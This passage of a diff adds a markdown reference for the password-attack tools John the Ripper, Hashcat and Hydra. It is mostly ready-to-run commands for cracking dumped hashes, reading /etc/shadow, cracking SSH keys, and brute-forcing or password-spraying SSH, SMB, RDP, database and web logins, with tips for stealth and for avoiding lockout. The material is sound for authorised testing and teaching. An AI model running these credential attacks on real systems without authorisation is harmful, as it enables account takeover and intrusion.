+john --format=md5crypt hashes.txt           # $1$ prefix
+
+# Windows formats
+john --format=NT hashes.txt                 # NTLM hashes
+john --format=netlm hashes.txt              # NetLM
+john --format=netntlm hashes.txt            # NetNTLM
+john --format=netntlmv2 hashes.txt          # NetNTLMv2
+
+# Web application formats
+john --format=phpass hashes.txt             # WordPress, phpBB
+john --format=drupal7 hashes.txt            # Drupal 7+
+john --format=django hashes.txt             # Django PBKDF2
+
+# Other formats
+john --format=bcrypt hashes.txt             # bcrypt ($2a$, $2b$, $2y$)
+john --format=PKZIP hashes.txt              # ZIP archives
+john --format=PDF hashes.txt                # PDF documents
+```
+
+### Wordlist Rules
+
+**Apply rules to wordlist:**
+
+```bash
+# Default ruleset
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
+
+# Specific ruleset
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hashes.txt
+john --wordlist=words.txt --rules=Single hashes.txt
+john --wordlist=words.txt --rules=Extra hashes.txt
+```
+
+**List available rules:**
+
+```bash
+john --list=rules
+john --list=rules:Jumbo
+```
+
+**Custom rule examples:**
+
+Edit `/etc/john/john.conf` or create custom config:
+
+```bash
+# Create custom rule section
+[List.Rules:CustomRule]
+# Append digits
+$[0-9]
+$[0-9]$[0-9]
+
+# Prepend year
+^2^0^2^4
+
+# Capitalize first letter
+c
+
+# Toggle case
+t
+
+# Duplicate word
+d
+
+# Reverse
+r
+
+# Rotate left
+[
+
+# Common substitutions
+sa@
+so0
+si1
+se3
+```
+
+**Apply custom rule:**
+
+```bash
+john --wordlist=words.txt --rules=CustomRule hashes.txt
+```
+
+**Rule syntax reference:**
+
+```bash
+# Character operations
+c               # Capitalize first, lowercase rest
+C               # Lowercase first, capitalize rest
+t               # Toggle case of all characters
+r               # Reverse the word
+d               # Duplicate the word
+f               # Reflect (append reversed)
+{               # Rotate left
+}               # Rotate right
+$X              # Append character X
+^X              # Prepend character X
+
+# Position operations
+[               # Remove first character
+]               # Remove last character
+D[N]            # Delete character at position N
+x[N][M]         # Extract substring from N with length M
+i[N][C]         # Insert character C at position N
+o[N][C]         # Overwrite position N with character C
+
+# Case operations
+u               # Uppercase all
+l               # Lowercase all
+C               # Capitalize first, lowercase rest
+T[N]            # Toggle case at position N
+
+# Substitutions
+s[X][Y]         # Replace all X with Y
+@[X]            # Purge all character X
+
+# Rejection rules
+-[c]            # Reject if contains character c
+-[N1][N2]       # Reject unless length between N1 and N2
++[N1][N2]       # Reject if length between N1 and N2
+![?X]           # Reject unless contains character class X
+%[N][X]         # Reject unless character at N is X
+```
+
+### Session Management
+
+**Save and restore sessions:**
+
+```bash
+# John automatically saves session as "john.rec"
+john --wordlist=rockyou.txt hashes.txt
+
+# Interrupt with Ctrl+C, restore later
+john --restore
+
+# Named session
+john --session=mysession --wordlist=rockyou.txt hashes.txt
+
+# Restore named session
+john --restore=mysession
+```
+
+**Check session status:**
+
+```bash
+john --status
+john --status=mysession
+```
+
+### Show Cracked Passwords
+
+**Display all cracked passwords:**
+
+```bash
+john --show hashes.txt
+
+# Specific format
+john --show --format=NT hashes.txt
+
+# Show only usernames
+john --show hashes.txt | cut -d: -f1
+
+# Show only passwords
+john --show hashes.txt | cut -d: -f2
+```
+
+**Pot file location:**
+
+```bash
+# Default pot file
+~/.john/john.pot
+
+# View pot file directly
+cat ~/.john/john.pot
+
+# Use specific pot file
+john --pot=custom.pot --show hashes.txt
+```
+
+### Performance Optimization
+
+**Test hash cracking speed:**
+
+```bash
+john --test
+john --test --format=NT
+```
+
+**Fork processes (multi-core):**
+
+```bash
+# Use 4 cores
+john --fork=4 --wordlist=rockyou.txt hashes.txt
+```
+
+**OpenMP optimization:**
+
+```bash
+# Set OpenMP threads
+export OMP_NUM_THREADS=4
+john --wordlist=rockyou.txt hashes.txt
+```
+
+**Incremental mode optimization:**
+
+```bash
+# Limit password length for faster cracking
+john --incremental=Alnum --min-length=4 --max-length=6 hashes.txt
+```
+
+### Mask Mode (Hybrid Attack)
+
+**Mask attack syntax:**
+
+```bash
+# Mask characters:
+# ?l = lowercase (a-z)
+# ?u = uppercase (A-Z)
+# ?d = digit (0-9)
+# ?s = special character
+# ?a = all printable ASCII
+
+# Example: 4 lowercase + 4 digits
+john --mask='?l?l?l?l?d?d?d?d' hashes.txt
+
+# Known prefix/suffix
+john --mask='Pass?d?d?d?d' hashes.txt
+john --mask='?l?l?l?l2024' hashes.txt
+
+# Variable length with incremental mask
+john --incremental-charcount=?d?l --mask='?1?1?1?1?1' hashes.txt
+```
+
+### External Mode (Custom Algorithms)
+
+**Create custom password generator:**
+
+Edit `/etc/john/john.conf`:
+
+```bash
+[List.External:Years]
+int YEAR;
+
+void init()
+{
+    YEAR = 1990;
+}
+
+void generate()
+{
+    word[0] = '0' + YEAR / 1000;
+    word[1] = '0' + (YEAR / 100) % 10;
+    word[2] = '0' + (YEAR / 10) % 10;
+    word[3] = '0' + YEAR % 10;
+    word[4] = 0;
+    YEAR++;
+    if (YEAR > 2030) YEAR = 1990;
+}
+```
+
+**Use external mode:**
+
+```bash
+john --external=Years hashes.txt
+```
+
+### Distributed Cracking
+
+**Node mode (distribute work across machines):**
+
+```bash
+# Node 1 (master)
+john --wordlist=rockyou.txt --node=1/4 hashes.txt
+
+# Node 2
+john --wordlist=rockyou.txt --node=2/4 hashes.txt
+
+# Node 3
+john --wordlist=rockyou.txt --node=3/4 hashes.txt
+
+# Node 4
+john --wordlist=rockyou.txt --node=4/4 hashes.txt
+```
+
+### Useful Wordlists
+
+**Default Kali wordlists:**
+
+```bash
+/usr/share/wordlists/rockyou.txt           # 14M passwords (decompress first)
+/usr/share/wordlists/rockyou.txt.gz        # Compressed version
+/usr/share/seclists/Passwords/             # SecLists password collections
+
+# Decompress rockyou
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+**Download additional wordlists:**
+
+```bash
+# SecLists
+sudo apt-get install seclists
+
+# CrackStation
+wget https://crackstation.net/files/crackstation.txt.gz
+gunzip crackstation.txt.gz
+```
+
+**Generate custom wordlists:**
+
+```bash
+# CeWL (spider website for words)
+cewl -d 2 -m 5 https://example.com -w custom_wordlist.txt
+
+# Crunch (pattern-based generation)
+crunch 8 8 -t Pass@@@@  # Pass + 4 digits
+crunch 6 10 abcdef123 -o wordlist.txt
+```
+
+### Practical Examples
+
+**Crack Linux shadow hashes:**
+
+```bash
+sudo unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+```
+
+**Crack NTLM hashes:**
+
+```bash
+# Hash format: username:hash
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hashes.txt
+```
+
+**Crack SSH private key:**
+
+```bash
+ssh2john id_rsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+john --show ssh.hash
+```
+
+**Crack ZIP archive:**
+
+```bash
+zip2john protected.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+```
+
+**Crack NetNTLMv2 (from Responder):**
+
+```bash
+# Hash from Responder output
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt netntlmv2.hash
+```
+
+---
+
+## Hashcat
+
+### Overview
+
+Hashcat performs GPU-accelerated password cracking with extensive hash format support and attack mode flexibility. Significantly faster than CPU-based cracking for supported hash types.
+
+### Installation and GPU Setup
+
+**Verify installation:**
+
+```bash
+hashcat --version
+hashcat -I  # List OpenCL devices
+```
+
+**Install/update drivers:**
+
+```bash
+# NVIDIA
+sudo apt-get install nvidia-driver nvidia-cuda-toolkit
+
+# AMD
+sudo apt-get install mesa-opencl-icd
+
+# Intel
+sudo apt-get install intel-opencl-icd
+```
+
+**Benchmark GPU:**
+
+```bash
+hashcat -b
+hashcat -b -m 1000  # Benchmark specific hash type (NTLM)
+```
+
+### Hash Mode Identification
+
+**List all supported hash modes:**
+
+```bash
+hashcat --help | grep -i "Hash modes"
+hashcat --example-hashes
+hashcat --example-hashes | grep -i ntlm
+```
+
+**Common hash mode numbers:**
+
+```bash
+0      = MD5
+100    = SHA1
+1000   = NTLM
+1400   = SHA2-256
+1700   = SHA2-512
+1800   = sha512crypt (Unix $6$)
+2500   = WPA/WPA2
+3200   = bcrypt
+5500   = NetNTLMv1
+5600   = NetNTLMv2
+6000   = RIPEMD-160
+13100  = Kerberos 5 TGS-REP etype 23
+16500  = JWT (JSON Web Token)
+22000  = WPA-PBKDF2-PMKID+EAPOL
+```
+
+**Identify hash automatically:**
+
+```bash
+hashcat hash.txt
+# Hashcat attempts auto-detection
+```
+
+### Attack Modes
+
+**Attack mode numbers:**
+
+```bash
+0 = Straight (dictionary attack)
+1 = Combination (combine two wordlists)
+3 = Brute-force (mask attack)
+6 = Hybrid Wordlist + Mask
+7 = Hybrid Mask + Wordlist
+9 = Association
+```
+
+### Dictionary Attack (Mode 0)
+
+**Basic dictionary attack:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Multiple wordlists:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt wordlist1.txt wordlist2.txt wordlist3.txt
+```
+
+**With rules:**
+
+```bash
+# Best64 rule (commonly effective)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Dive rule (aggressive)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
+
+# Multiple rules
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rule1.rule -r rule2.rule
+```
+
+**Common hashcat rules:**
+
+```bash
+/usr/share/hashcat/rules/best64.rule           # Good first attempt
+/usr/share/hashcat/rules/rockyou-30000.rule    # Top 30k from RockYou
+/usr/share/hashcat/rules/d3ad0ne.rule          # Comprehensive
+/usr/share/hashcat/rules/dive.rule             # Aggressive mutations
+/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+/usr/share/hashcat/rules/T0XlC.rule            # Advanced
+/usr/share/hashcat/rules/generated2.rule       # Auto-generated patterns
+```
+
+### Combination Attack (Mode 1)
+
+**Combine two wordlists:**
+
+```bash
+# Creates candidates like: word1 + word2
+hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
+```
+
+**Example use case:**
+
+```bash
+# firstnames.txt contains: john, mary
+# lastnames.txt contains: smith, johnson
+# Generates: johnsmith, johnjohnson, marysmith, maryjohnson
+hashcat -m 1000 -a 1 hashes.txt firstnames.txt lastnames.txt
+```
+
+### Mask Attack (Mode 3)
+
+**Mask syntax:**
+
+```bash
+?l = lowercase (abcdefghijklmnopqrstuvwxyz)
+?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
+?d = digit (0123456789)
+?h = lowercase hex (0123456789abcdef)
+?H = uppercase hex (0123456789ABCDEF)
+?s = special (!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~)
+?a = all printable ASCII (?l?u?d?s)
+?b = all bytes (0x00-0xff)
+```
+
+**Basic mask attacks:**
+
+```bash
+# 8 lowercase letters
+hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
+
+# Uppercase + 6 digits (Password123456 pattern)
+hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d?d?d
+
+# Known prefix
+hashcat -m 1000 -a 3 hashes.txt 'Pass?d?d?d?d'
+
+# Known suffix
+hashcat -m 1000 -a 3 hashes.txt '?l?l?l?l2024'
+```
+
+**Increment mode (variable length):**
+
+```bash
+# Brute force 1-8 characters, all lowercase
+hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 1 --increment-max 8 ?l?l?l?l?l?l?l?l
+
+# 4-6 digits
+hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 4 --increment-max 6 ?d?d?d?d?d?d
+```
+
+**Custom charset:**
+
+```bash
+# Define custom charset
+hashcat -m 1000 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1
+# -1 defines charset1 as lowercase + digits
+
+# Multiple custom charsets
+hashcat -m 1000 -a 3 hashes.txt -1 ?l?u -2 ?d?s ?1?1?1?1?2?2
+# -1 = letters, -2 = digits + special
+```
+
+**Mask file (multiple masks):**
+
+```bash
+# Create masks.hcmask
+cat > masks.hcmask << EOF
+?u?l?l?l?l?l?d?d
+?u?l?l?l?l?d?d?d?d
+Pass?d?d?d?d
+?l?l?l?l2024
+EOF
+
+# Use mask file
+hashcat -m 1000 -a 3 hashes.txt masks.hcmask
+```
+
+### Hybrid Attacks
+
+**Hybrid Wordlist + Mask (Mode 6):**
+
+```bash
+# Append mask to wordlist words
+hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d
+# password -> password1234, password9876, etc.
+```
+
+**Hybrid Mask + Wordlist (Mode 7):**
+
+```bash
+# Prepend mask to wordlist words
+hashcat -m 1000 -a 7 hashes.txt ?d?d?d?d wordlist.txt
+# password -> 1234password, 9876password, etc.
+```
+
+### Session Management
+
+**Named session:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --session=mysession
+
+# Restore session
+hashcat --restore --session=mysession
+
+# Remove session
+hashcat --session=mysession --remove
+```
+
+**Checkpoint (auto-save progress):**
+
+```bash
+# Set checkpoint interval (seconds)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --checkpoint=30
+```
+
+### Output Options
+
+**Show cracked passwords:**
+
+```bash
+hashcat -m 1000 hashes.txt --show
+
+# Output format
+hashcat -m 1000 hashes.txt --show --outfile-format=2
+# Formats: 1=hash, 2=plain, 3=hex_plain, 5=hash:plain
+```
+
+**Save output to file:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt
+
+# Append to file
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt --outfile-append
+```
+
+**Potfile location:**
+
+```bash
+# Default
+~/.hashcat/hashcat.potfile
+
+# Custom potfile
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-path=custom.potfile
+
+# Disable potfile
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-disable
+```
+
+### Performance Tuning
+
+**Workload profile:**
+
+```bash
+-w 1  # Low (desktop usage)
+-w 2  # Default
+-w 3  # High (dedicated cracking)
+-w 4  # Nightmare (max performance, system unusable)
+
+hashcat -m 1000 -a 0 -w 3 hashes.txt rockyou.txt
+```
+
+**Optimize kernel:**
+
+```bash
+# Enable optimizations
+hashcat -m 1000 -a 0 -O hashes.txt rockyou.txt
+
+# Disable optimizations (for longer passwords)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+```
+
+**Specific device selection:**
+
+```bash
+# List devices
+hashcat -I
+
+# Use specific device
+hashcat -m 1000 -a 0 -d 1 hashes.txt rockyou.txt
+
+# Use multiple devices
+hashcat -m 1000 -a 0 -d 1,2,3 hashes.txt rockyou.txt
+```
+
+**Limit runtime:**
+
+```bash
+# Run for 60 seconds
+hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a --runtime=60
+
+# Quit after first crack
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --quit-after-first-crack
+```
+
+### Debug and Monitoring
+
+**Status display:**
+
+```bash
+# During cracking, press 's' for status
+# Press 'p' to pause
+# Press 'r' to resume
+# Press 'b' to bypass current mask/word
+# Press 'q' to quit
+```
+
+**Debug mode:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --debug-mode=1 --debug-file=debug.txt
+```
+
+**Verbose output:**
+
+```bash
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt --status --status-timer=10
+```
+
+### Rule Creation
+
+**Basic rule syntax:**
+
+```bash
+# Create custom.rule
+cat > custom.rule << EOF
+# Nothing (no modification)
+:
+# Lowercase all
+l
+# Uppercase all
+u
+# Capitalize
+c
+# Append year
+$2$0$2$4
+# Append digits
+$0 $1 $2 $3 $4 $5 $6 $7 $8 $9
+# Common substitutions
+so0 sa@ si1 se3
+# Toggle case
+t
+EOF
+
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r custom.rule
+```
+
+**Generate rules from cracked passwords:**
+
+```bash
+# Analyze password patterns
+hashcat --stdout -a 0 cracked_plain.txt | sort -u > unique_plain.txt
+
+# Use maskprocessor to identify patterns
+mp64 --increment --increment-min=8 --increment-max=8 ?a?a?a?a?a?a?a?a | head
+```
+
+### Hash Format Examples
+
+**MD5:**
+
+```bash
+echo -n 'password' | md5sum | cut -d' ' -f1 > md5.hash
+hashcat -m 0 -a 0 md5.hash /usr/share/wordlists/rockyou.txt
+```
+
+**SHA256:**
+
+```bash
+echo -n 'password' | sha256sum | cut -d' ' -f1 > sha256.hash
+hashcat -m 1400 -a 0 sha256.hash rockyou.txt
+```
+
+**NTLM:**
+
+```bash
+# Format: hash or username:hash
+hashcat -m 1000 -a 0 ntlm.hash rockyou.txt
+```
+
+**NetNTLMv2:**
+
+```bash
+# Format from Responder: username::domain:challenge:response:response
+hashcat -m 5600 -a 0 netntlmv2.hash rockyou.txt
+```
+
+**WPA/WPA2:**
+
+```bash
+# Convert pcap to hashcat format
+hcxpcapngtool -o wpa.hash capture.pcap
+
+# Crack WPA2
+hashcat -m 22000 -a 0 wpa.hash rockyou.txt
+```
+
+**bcrypt:**
+
+```bash
+hashcat -m 3200 -a 0 bcrypt.hash rockyou.txt
+```
+
+**Kerberos TGS-REP:**
+
+```bash
+# Format: $krb5tgs$23$...
+hashcat -m 13100 -a 0 kerberos.hash rockyou.txt
+```
+
+### Practical Examples
+
+**Crack Windows NTLM hashes:**
+
+```bash
+# Hash obtained from SAM dump
+hashcat -m 1000 -a 0 -w 3 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+**Crack with multiple strategies:**
+
+```bash
+# Strategy 1: Dictionary
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+
+# Strategy 2: Dictionary + rules
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Strategy 3: Mask (Password + 4 digits)
+hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d
+
+# Strategy 4: Hybrid (wordlist + digits)
+hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d
+```
+
+**Distributed cracking:**
+
+```bash
+# Skip first 50% of wordlist
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -s 0 -l 50%
+
+# Process second 50%
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -s 50% -l 100%
+```
+
+---
+
+## Hydra
+
+### Overview
+
+Hydra performs online password brute forcing against network services. Supports 50+ protocols including SSH, FTP, HTTP, SMB, RDP, and databases.
+
+### Basic Syntax
+
+```bash
+hydra [options] [target] [service]
+```
+
+### Common Options
+
+```bash
+-l <login>        # Single username
+-L <file>         # Username list
+-p <password>     # Single password
+-P <file>         # Password list
+-s <port>         # Custom port
+-t <tasks>        # Parallel tasks (default 16)
+-w <timeout>      # Wait time for responses
+-f                # Exit after first valid credential found
+-F                # Exit after first valid credential per user
+-v / -V           # Verbose / Very verbose
+-o <file>         # Output file
+-b <format>       # Output format (text, json, jsonv1)
+-I                # Ignore restore file
+-R                # Restore previous session
+-S                # SSL/TLS connection
+-O                # Use old SSL v2 and v3
+-C <file>         # Colon-separated user:pass format
+-e <nsr>          # Additional checks (n=null, s=same as username, r=reverse username)
+```
+
+### Service-Specific Syntax
+
+**SSH:**
+
+```bash
+# Basic SSH brute force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+
+# Multiple usernames
+hydra -L users.txt -P passwords.txt ssh://192.168.1.10
+
+# Custom port
+hydra -l admin -P passwords.txt ssh://192.168.1.10:2222
+
+# Increase threads (use with caution)
+hydra -l root -P passwords.txt -t 4 ssh://192.168.1.10
+```
+
+**FTP:**
+
+```bash
+hydra -l admin -P passwords.txt ftp://192.168.1.10
+
+# Anonymous FTP check
+
+hydra -l anonymous -p "" ftp://192.168.1.10
+
+# Multiple users
+
+hydra -L users.txt -P passwords.txt ftp://192.168.1.10
+
+````
+
+**HTTP/HTTPS Forms:**
+```bash
+# HTTP POST form (login page)
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+
+# GET form
+hydra -l admin -P passwords.txt 192.168.1.10 http-get-form "/login:user=^USER^&pass=^PASS^:Incorrect"
+
+# HTTPS POST form
+hydra -l admin -P passwords.txt 192.168.1.10 -s 443 https-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=failed"
+
+# With cookies/session
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=failed:H=Cookie: PHPSESSID=abc123"
+
+# Success string instead of failure (S= instead of F=)
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"
+````
+
+**HTTP Basic Auth:**
+
+```bash
+hydra -l admin -P passwords.txt 192.168.1.10 http-get /admin/
+
+# HTTPS
+hydra -l admin -P passwords.txt -s 443 192.168.1.10 https-get /admin/
+```
+
+**SMB:**
+
+```bash
+# SMB protocol
+hydra -l administrator -P passwords.txt smb://192.168.1.10
+
+# With domain
+hydra -l 'DOMAIN\administrator' -P passwords.txt smb://192.168.1.10
+
+# Multiple users
+hydra -L users.txt -P passwords.txt smb://192.168.1.10
+```
+
+**RDP (Remote Desktop):**
+
+```bash
+hydra -l administrator -P passwords.txt rdp://192.168.1.10
+
+# With domain
+hydra -l 'DOMAIN\user' -P passwords.txt rdp://192.168.1.10
+```
+
+**MySQL:**
+
+```bash
+hydra -l root -P passwords.txt mysql://192.168.1.10
+
+# Custom port
+hydra -l root -P passwords.txt mysql://192.168.1.10:3307
+```
+
+**PostgreSQL:**
+
+```bash
+hydra -l postgres -P passwords.txt postgres://192.168.1.10
+
+# Specify database
+hydra -l postgres -P passwords.txt postgres://192.168.1.10/template1
+```
+
+**MSSQL:**
+
+```bash
+hydra -l sa -P passwords.txt mssql://192.168.1.10
+```
+
+**Telnet:**
+
+```bash
+hydra -l admin -P passwords.txt telnet://192.168.1.10
+
+# Custom prompts
+hydra -l admin -P passwords.txt telnet://192.168.1.10 -m "Login:" -m "Password:"
+```
+
+**VNC:**
+
+```bash
+hydra -P passwords.txt vnc://192.168.1.10
+# VNC typically only uses password, no username
+```
+
+**SMTP:**
+
+```bash
+hydra -l user@domain.com -P passwords.txt smtp://192.168.1.10
+
+# SMTP with TLS
+hydra -l user@domain.com -P passwords.txt -S smtp://192.168.1.10:587
+```
+
+**POP3:**
+
+```bash
+hydra -l user@domain.com -P passwords.txt pop3://192.168.1.10
+
+# POP3S
+hydra -l user@domain.com -P passwords.txt -S pop3://192.168.1.10:995
+```
+
+**IMAP:**
+
+```bash
+hydra -l user@domain.com -P passwords.txt imap://192.168.1.10
+
+# IMAPS
+hydra -l user@domain.com -P passwords.txt -S imap://192.168.1.10:993
+```
+
+**SNMP:**
+
+```bash
+# SNMP community string brute force
+hydra -P community_strings.txt snmp://192.168.1.10
+```
+
+**LDAP:**
+
+```bash
+hydra -l 'cn=admin,dc=example,dc=com' -P passwords.txt ldap://192.168.1.10
+```
+
+**MongoDB:**
+
+```bash
+hydra -l admin -P passwords.txt mongodb://192.168.1.10
+```
+
+**Redis:**
+
+```bash
+hydra -P passwords.txt redis://192.168.1.10
+# Redis authentication password only
+```
+
+### Advanced Usage
+
+**Colon-separated credentials file:**
+
+```bash
+# credentials.txt format: username:password
+admin:password123
+root:toor
+user:letmein
+
+hydra -C credentials.txt ssh://192.168.1.10
+```
+
+**Exit on first success:**
+
+```bash
+# Stop after finding ANY valid credential
+hydra -l admin -P passwords.txt -f ssh://192.168.1.10
+
+# Stop after finding valid credential for each user
+hydra -L users.txt -P passwords.txt -F ssh://192.168.1.10
+```
+
+**Additional password checks:**
+
+```bash
+# Try null password, username as password, reversed username
+hydra -l admin -P passwords.txt -e nsr ssh://192.168.1.10
+
+# -e n: Try empty/null password
+# -e s: Try username as password
+# -e r: Try reversed username as password
+```
+
+**Output options:**
+
+```bash
+# Save to file
+hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10
+
+# JSON output
+hydra -l admin -P passwords.txt -b json -o results.json ssh://192.168.1.10
+
+# Append to existing file
+hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10
+# Note: Hydra automatically appends
+```
+
+**Session management:**
+
+```bash
+# Save progress automatically (default: hydra.restore)
+hydra -l admin -P rockyou.txt ssh://192.168.1.10
+
+# Interrupt with Ctrl+C, restore with:
+hydra -R
+
+# Ignore/clear restore file
+hydra -I -l admin -P passwords.txt ssh://192.168.1.10
+```
+
+**Rate limiting:**
+
+```bash
+# Adjust parallel tasks (default 16)
+hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10
+
+# Set wait time between attempts (seconds)
+hydra -l admin -P passwords.txt -w 3 ssh://192.168.1.10
+
+# Combine for slower, stealthier attacks
+hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.10
+```
+
+**Proxy support:**
+
+```bash
+# Use SOCKS4 proxy
+hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10 -x 127.0.0.1:1080:socks4
+
+# SOCKS5 proxy
+hydra -l admin -P passwords.txt ssh://192.168.1.10 -x 127.0.0.1:1080:socks5
+
+# HTTP proxy
+hydra -l admin -P passwords.txt http-post-form "..." -x 127.0.0.1:8080:http
+```
+
+**Verbose modes:**
+
+```bash
+# Verbose (show attempts)
+hydra -l admin -P passwords.txt -v ssh://192.168.1.10
+
+# Very verbose (show all details)
+hydra -l admin -P passwords.txt -V ssh://192.168.1.10
+
+# Debug mode
+hydra -l admin -P passwords.txt -d ssh://192.168.1.10
+```
+
+### HTTP Form Attack Details
+
+**Identify form parameters:**
+
+```bash
+# View page source or use browser dev tools
+# Find form action, input names, failure message
+
+# Example form:
+# <form action="/login.php" method="POST">
+#   <input name="username">
+#   <input name="password">
+# </form>
+# Error message: "Login failed"
+
+# Hydra syntax:
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
+```
+
+**Complex form parameters:**
+
+```bash
+# Multiple parameters
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^&submit=Login&redirect=/admin:F=Invalid"
+
+# Hidden fields
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^&csrf=static_token:F=failed"
+
+# Conditional redirect (success condition)
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:S=302"
+```
+
+**Custom headers:**
+
+```bash
+# Add custom headers
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/api/login:username=^USER^&password=^PASS^:F=failed:H=Content-Type: application/json:H=User-Agent: CustomAgent"
+
+# Multiple headers
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=fail:H=X-Forwarded-For\: 127.0.0.1:H=Cookie\: session=abc"
+```
+
+**JSON POST data:**
+
+```bash
+# Some applications use JSON instead of form data
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Invalid:H=Content-Type\: application/json"
+```
+
+### Wordlist Optimization
+
+**Generate targeted wordlists:**
+
+```bash
+# Common default credentials
+cat > defaults.txt << EOF
+admin:admin
+admin:password
+root:root
+root:toor
+administrator:password
+EOF
+
+hydra -C defaults.txt ssh://192.168.1.10
+```
+
+**Username enumeration first:**
+
+```bash
+# Enumerate valid usernames with null password
+hydra -L users.txt -p '' ssh://192.168.1.10 -e n -o valid_users.txt
+
+# Then brute force only valid users
+hydra -L valid_users.txt -P passwords.txt ssh://192.168.1.10
+```
+
+**Password spraying pattern:**
+
+```bash
+# Try few common passwords against many users (avoid account lockout)
+cat > common_passwords.txt << EOF
+Password123
+Welcome1
+Company2024
+Summer2024
+EOF
+
+hydra -L users.txt -P common_passwords.txt -t 1 -w 5 ssh://192.168.1.10
+```
+
+### Performance Considerations
+
+**Optimal task settings by service:**
+
+[Inference] - Based on typical service behavior and rate limiting:
+
+```bash
+# SSH: Conservative (4-8 tasks)
+hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10
+
+# FTP: Moderate (8-16 tasks)
+hydra -l admin -P passwords.txt -t 16 ftp://192.168.1.10
+
+# HTTP: Higher (16-32 tasks)
+hydra -l admin -P passwords.txt -t 32 http-post-form "..."
+
+# SMB: Low (1-4 tasks, avoid lockout)
+hydra -l administrator -P passwords.txt -t 1 -w 3 smb://192.168.1.10
+```
+
+**Avoid account lockout:**
+
+```bash
+# Low task count, wait time between attempts
+hydra -L users.txt -P short_list.txt -t 1 -w 5 -f ssh://192.168.1.10
+
+# Try few passwords per user, then move to next
+hydra -L users.txt -P top_10_passwords.txt -t 1 -w 10 ssh://192.168.1.10
+```
+
+### Troubleshooting
+
+**Common errors and solutions:**
+
+```bash
+# "Too many connections" error
+# Solution: Reduce tasks
+hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10
+
+# Connection timeout
+# Solution: Increase wait time
+hydra -l admin -P passwords.txt -w 10 ssh://192.168.1.10
+
+# False positives in HTTP forms
+# Solution: Verify failure string is unique
+# Check page source for exact error message
+
+# SSL/TLS errors
+# Solution: Use -S flag or try older SSL
+hydra -l admin -P passwords.txt -S smtp://192.168.1.10
+hydra -l admin -P passwords.txt -O smtp://192.168.1.10
+
+# Service not supported
+# Solution: Check supported services
+hydra -U
+```
+
+**Debug connection issues:**
+
